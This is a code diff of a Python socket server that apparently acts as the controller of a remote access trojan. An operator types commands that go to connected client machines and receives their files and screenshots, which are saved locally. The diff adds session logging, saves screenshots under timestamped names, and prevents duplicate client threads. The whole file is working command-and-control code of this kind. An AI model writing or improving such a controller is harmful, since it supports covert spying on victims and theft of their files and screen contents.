@@ -1,12 +1,14 @@
 import socket
 import threading
+import time
 
 class App:
     def __init__(self):
         self.port = 5554
         self.socket = None
         self.clients = {}
-        
+        self.time = time.time()
+
     def run(self):
         try:
             self.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
@@ -14,6 +16,8 @@ class App:
             self.socket.listen(10) #max clients
             print("server now online")
             print("send a command to the connected client : ")
+            with open("ressources/logs/log_" + str(self.time), "w") as f:
+                f.write("server connected at local time : " + str(self.time) + "\n")
         except Exception as e:
             print("error while creating server : ", e)
             
@@ -21,8 +25,9 @@ class App:
             try:
                 client, client_addr = self.socket.accept()
                 
-                self.clients[client_addr] = threading.Thread(target=self.client, args=(client, client_addr, ))
-                self.clients[client_addr].start()
+                if not client_addr in self.clients:
+                    self.clients[client_addr] = threading.Thread(target=self.client, args=(client, client_addr, ))
+                    self.clients[client_addr].start()
                 
             except Exception as e:
                 print("error : ", e)
@@ -30,16 +35,22 @@ class App:
 
         
     def client(self, client, client_addr):
+        with open("ressources/logs/log_" + str(self.time), "a") as f:
+            f.write("connected to : " + str(client_addr) + "\n")
         running = True
         while running:
+            new_logs = ""
             try:
                 msg_out = ""
                 msg_out = input("[" + client_addr[0] + "/" + str(client_addr[1]) + "] >")
+                new_logs += "[" + client_addr[0] + "/" + str(client_addr[1]) + "] > "+ msg_out + "\n"
+                    
                 client.send(msg_out.encode())
                 
                 recv_header = client.recv(4096).decode()
                 
                 print("reveiced : ")
+                new_logs += "reveived : \n"
                 if recv_header.startswith("FILE"):
                     try:
                         header = recv_header.split(":")
@@ -52,14 +63,17 @@ class App:
                             if not chunk:
                                 break
                             recv_file += chunk
-                            print(f"Received {len(recv_file)}/{int(header[2])} bytes")
+                            print(f"received {len(recv_file)}/{int(header[2])} bytes")
                             
                         with open(f"received_{header[1]}", "wb") as f:
-                            f.write(recv_file)
+                            f.write(recv_file)                          
+                            
                             
                         print(f"filed saved as : received_{header[1]}")
+                        new_logs += f"filed saved as : received_{header[1]} \n"
                     except Exception as e:
                         print("error while downloading file : ", e)
+                        new_logs += "error while downloading file : " + str(e) + "\n"
                         
                 elif recv_header.startswith("IMG"):
                     try:
@@ -73,16 +87,24 @@ class App:
                                 break
                             img_data += packet
                         
-                        with open("screenshot.png", "wb") as f:
+                        name = "ressources/screenshots/screenshot_" + str(time.time()) + ".png"
+                        
+                        with open(name, "wb") as f:
                             f.write(img_data)
                         
-                        print("screenshot received and saved as screenshot.png")
+                        print("screenshot received and saved as ", name)
+                        new_logs += "screenshot received and saved as " + name + "\n"
                     except Exception as e:
                         print("error while downloading screenshot : ", e)
+                        new_logs += "error while downloading screenshot : " + str(e) + "\n"
                         
                 else:
                     msg = client.recv(4096).decode()
                     print(msg)
+                    new_logs += "received message : " + msg + "\n"
+                    
+                with open("ressources/logs/log_" + str(self.time), "a") as f:
+                    f.write(new_logs)
             
             except:
                 running = False
